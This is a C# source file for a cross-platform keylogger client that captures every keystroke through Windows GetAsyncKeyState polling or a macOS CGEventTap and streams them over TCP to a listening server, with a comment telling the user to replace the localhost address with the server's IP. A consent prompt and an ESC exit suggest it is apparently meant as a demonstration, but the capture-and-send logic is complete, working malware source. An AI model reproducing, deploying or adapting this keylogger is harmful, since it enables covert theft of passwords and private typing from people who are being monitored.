using System;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace KeyLoggerClient
{
    class Program
    {
#if WINDOWS
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        public static extern int MapVirtualKey(int uCode, int uMapType);

        [DllImport("user32.dll")]
        public static extern short GetKeyState(int nVirtKey);

        const int VK_SHIFT = 0x10;
        const int VK_CAPITAL = 0x14;
        const int MAPVK_VK_TO_CHAR = 2;
#elif MACOS
        // Type definitions for macOS interop
        private struct CGEventTapProxy { IntPtr Handle; }

        // CoreFoundation framework imports
        [DllImport("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")]
        private static extern IntPtr CFRunLoopGetCurrent();

        [DllImport("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")]
        private static extern void CFRunLoopRun();

        [DllImport("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")]
        private static extern IntPtr CFMachPortCreateRunLoopSource(
            IntPtr allocator,
            IntPtr port,
            int order);

        [DllImport("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")]
        private static extern void CFRunLoopAddSource(
            IntPtr rl,
            IntPtr source,
            IntPtr mode);

        // CoreGraphics framework imports
        [DllImport("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics")]
        private static extern IntPtr CGEventTapCreate(
            CGEventTapLocation tap,
            CGEventTapPlacement place,
            CGEventTapOptions options,
            CGEventMask eventsOfInterest,
            CGEventTapCallback callback,
            IntPtr refcon);

        [DllImport("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics")]
        private static extern CGEventFlags CGEventGetFlags(IntPtr eventRef);

        [DllImport("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics")]
        private static extern ushort CGEventGetIntegerValueField(IntPtr eventRef, CGEventField field);


        // Callback delegate for the event tap
        private delegate IntPtr CGEventTapCallback(CGEventTapProxy proxy, CGEventType type, IntPtr eventRef, IntPtr refcon);

        // Required enums and structs for macOS event handling
        private enum CGEventTapLocation { kCGHIDEventTap = 0 }
        private enum CGEventTapPlacement { kCGHeadInsertEventTap = 0 }
        private enum CGEventTapOptions { kCGEventTapOptionDefault = 0 }
        private enum CGEventType { kCGEventKeyDown = 10 }
        private enum CGEventField { kCGKeyboardEventKeycode = 9 }

        [Flags]
        private enum CGEventFlags : ulong
        {
            kCGEventFlagMaskShift = 0x20000,
            kCGEventFlagMaskCapsLock = 0x10000
        }

        private enum CGEventMask : ulong
        {
            kCGEventMaskForAllEvents = 0xffffffffffffffff
        }

        static NetworkStream globalStream;
#endif

        static void Main(string[] args)
        {
            // Transparency message
            Console.WriteLine("WARNING: This program will log all key presses.");
            Console.Write("Do you want to continue? (yes/no): ");
            string input = Console.ReadLine();

            if (input?.ToLower() != "yes" && input?.ToLower() != "y")
            {
                Console.WriteLine("Exiting program.");
                return;
            }

            Console.WriteLine("Keylogger is now running. Press 'ESC' to stop.");

            // Note: replace localhost ip with the server's IP address
            using TcpClient client = new TcpClient("127.0.0.1", 5001);
            using NetworkStream stream = client.GetStream();

            try
            {
                globalStream = stream;
                RunKeylogger(stream);
            }
            catch (Exception e)
            {
                Console.WriteLine("An error occurred. Keylogger stopped.");
                Console.WriteLine(e.Message);
                throw;
            }
        }

        static void RunKeylogger(NetworkStream stream)
        {
#if WINDOWS
            bool[] keyStates = new bool[256];

            while (true)
            {
                for (int vKey = 0; vKey < 256; vKey++)
                {
                    short keyState = GetAsyncKeyState(vKey);

                    if (KeyIsPressed(keyState) && !keyStates[vKey])
                    {
                        string key;

                        if (vKey == (int)ConsoleKey.Escape)
                        {
                            // note: in a real key logger, you would not exit the program on escape
                            key = "Escape";
                            Console.WriteLine("\nESC pressed. Keylogger stopped.");
                            byte[] exitMessage = Encoding.ASCII.GetBytes(key + " ");
                            stream.Write(exitMessage, 0, exitMessage.Length);
                            return;
                        }
                        else
                        {
                            // For all other keys, use the mapping logic
                            key = GetKeyString(vKey);
                        }

                        if (!string.IsNullOrEmpty(key))
                        {
                            byte[] data = Encoding.ASCII.GetBytes(key + " ");
                            stream.Write(data, 0, data.Length);
                        }

                        keyStates[vKey] = true;

                        if (key == "Escape")
                        {
                            Console.WriteLine("\nESC pressed. Keylogger stopped.");
                            return;
                        }
                    }
                    else if (!KeyIsPressed(keyState))
                    {
                        keyStates[vKey] = false;
                    }
                }

                Thread.Sleep(10);
            }
#elif MACOS
            // Create an event tap to monitor keyboard events
            IntPtr eventTap = CGEventTapCreate(
                CGEventTapLocation.kCGHIDEventTap,
                CGEventTapPlacement.kCGHeadInsertEventTap,
                CGEventTapOptions.kCGEventTapOptionDefault,
                (CGEventMask)CGEventMask.kCGEventMaskForAllEvents,
                new CGEventTapCallback(KeyboardCallback),
                IntPtr.Zero);

            if (eventTap == IntPtr.Zero)
            {
                Console.WriteLine("Failed to create event tap. Try running with sudo.");
                return;
            }

            // Create a run loop source and add it to the current run loop
            IntPtr runLoopSource = CFMachPortCreateRunLoopSource(IntPtr.Zero, eventTap, 0);
            if (runLoopSource == IntPtr.Zero)
            {
                Console.WriteLine("Failed to create run loop source.");
                return;
            }

            IntPtr runLoop = CFRunLoopGetCurrent();
            CFRunLoopAddSource(runLoop, runLoopSource, IntPtr.Zero);

            // Start the run loop
            CFRunLoopRun();
#endif
        }

#if WINDOWS
        static bool KeyIsPressed(short keyState)
        {
            return (keyState & 0x8000) != 0;
        }

        static string GetKeyString(int vKey)
        {
            // Map virtual key to character
            int charCode = MapVirtualKey(vKey, MAPVK_VK_TO_CHAR);

            if (charCode == 0) return null;

            char keyChar = (char)charCode;

            // Check for Shift key or Caps Lock
            bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

            // Apply Shift or Caps Lock transformations
            if (char.IsLetter(keyChar))
            {
                if (shiftPressed ^ capsLockOn) // XOR: Shift or Caps Lock, but not both
                {
                    keyChar = char.ToUpper(keyChar);
                }
                else
                {
                    keyChar = char.ToLower(keyChar);
                }
            }
            else if (shiftPressed)
            {
                switch (keyChar)
                {
                    case '1': keyChar = '!'; break;
                    case '2': keyChar = '@'; break;
                    case '3': keyChar = '#'; break;
                    case '4': keyChar = '$'; break;
                    case '5': keyChar = '%'; break;
                    case '6': keyChar = '^'; break;
                    case '7': keyChar = '&'; break;
                    case '8': keyChar = '*'; break;
                    case '9': keyChar = '('; break;
                    case '0': keyChar = ')'; break;
                    case '-': keyChar = '_'; break;
                    case '=': keyChar = '+'; break;
                    case '[': keyChar = '{'; break;
                    case ']': keyChar = '}'; break;
                    case '\\': keyChar = '|'; break;
                    case ';': keyChar = ':'; break;
                    case '\'': keyChar = '"'; break;
                    case ',': keyChar = '<'; break;
                    case '.': keyChar = '>'; break;
                    case '/': keyChar = '?'; break;
                }
            }

            return keyChar.ToString();
        }
#elif MACOS
        static IntPtr KeyboardCallback(CGEventTapProxy proxy, CGEventType type, IntPtr eventRef, IntPtr refcon)
        {
            if (type == CGEventType.kCGEventKeyDown)
            {
                ushort keycode = CGEventGetIntegerValueField(eventRef, CGEventField.kCGKeyboardEventKeycode);
                CGEventFlags flags = CGEventGetFlags(eventRef);

                // Check for Escape key (keycode 53 on macOS)
                if (keycode == 53)
                {
                    byte[] exitMessage = Encoding.ASCII.GetBytes("Escape ");
                    globalStream.Write(exitMessage, 0, exitMessage.Length);
                    Console.WriteLine("\nESC pressed. Keylogger stopped.");
                    Environment.Exit(0);
                }

                // Convert keycode to character
                string key = GetKeyFromKeycode(keycode, flags);
                Console.WriteLine(key);
                if (!string.IsNullOrEmpty(key))
                {
                    byte[] data = Encoding.ASCII.GetBytes(key + " ");
                    Console.Write(key);
                    globalStream.Write(data, 0, data.Length);
                }
            }

            return eventRef;
        }

        static string GetKeyFromKeycode(ushort keycode, CGEventFlags flags)
        {
            bool isShiftPressed = (flags & CGEventFlags.kCGEventFlagMaskShift) != 0;
            bool isCapsLockOn = (flags & CGEventFlags.kCGEventFlagMaskCapsLock) != 0;

            // Expanded key mapping
            switch (keycode)
            {
                // Letters
                case 0: return isShiftPressed ? "A" : "a";
                case 1: return isShiftPressed ? "S" : "s";
                case 2: return isShiftPressed ? "D" : "d";
                case 3: return isShiftPressed ? "F" : "f";
                case 4: return isShiftPressed ? "H" : "h";
                case 5: return isShiftPressed ? "G" : "g";
                case 6: return isShiftPressed ? "Z" : "z";
                case 7: return isShiftPressed ? "X" : "x";
                case 8: return isShiftPressed ? "C" : "c";
                case 9: return isShiftPressed ? "V" : "v";
                case 11: return isShiftPressed ? "B" : "b";
                case 13: return isShiftPressed ? "W" : "w";
                case 14: return isShiftPressed ? "E" : "e";
                case 15: return isShiftPressed ? "R" : "r";
                case 16: return isShiftPressed ? "Y" : "y";
                case 17: return isShiftPressed ? "T" : "t";
                case 31: return isShiftPressed ? "O" : "o";
                case 32: return isShiftPressed ? "U" : "u";
                case 34: return isShiftPressed ? "I" : "i";
                case 35: return isShiftPressed ? "P" : "p";
                case 37: return isShiftPressed ? "L" : "l";
                case 38: return isShiftPressed ? "J" : "j";
                case 40: return isShiftPressed ? "K" : "k";
                case 45: return isShiftPressed ? "N" : "n";
                case 46: return isShiftPressed ? "M" : "m";

                // Numbers and their shifted symbols
                case 18: return isShiftPressed ? "!" : "1";
                case 19: return isShiftPressed ? "@" : "2";
                case 20: return isShiftPressed ? "#" : "3";
                case 21: return isShiftPressed ? "$" : "4";
                case 23: return isShiftPressed ? "%" : "5";
                case 22: return isShiftPressed ? "^" : "6";
                case 26: return isShiftPressed ? "&" : "7";
                case 28: return isShiftPressed ? "*" : "8";
                case 25: return isShiftPressed ? "(" : "9";
                case 29: return isShiftPressed ? ")" : "0";

                // Special characters
                case 27: return isShiftPressed ? "_" : "-";
                case 24: return isShiftPressed ? "+" : "=";
                case 33: return isShiftPressed ? "{" : "[";
                case 30: return isShiftPressed ? "}" : "]";
                case 41: return isShiftPressed ? ":" : ";";
                case 39: return isShiftPressed ? "\"" : "'";
                case 43: return isShiftPressed ? "<" : ",";
                case 47: return isShiftPressed ? ">" : ".";
                case 44: return isShiftPressed ? "?" : "/";
                case 42: return isShiftPressed ? "|" : "\\";

                // Function keys
                case 36: return "Return";
                case 48: return "Tab";
                case 49: return "Space";
                case 51: return "Delete";
                case 53: return "Escape";
                case 123: return "Left";
                case 124: return "Right";
                case 125: return "Down";
                case 126: return "Up";

                default: return null;
            }
        }
#endif
    }
}
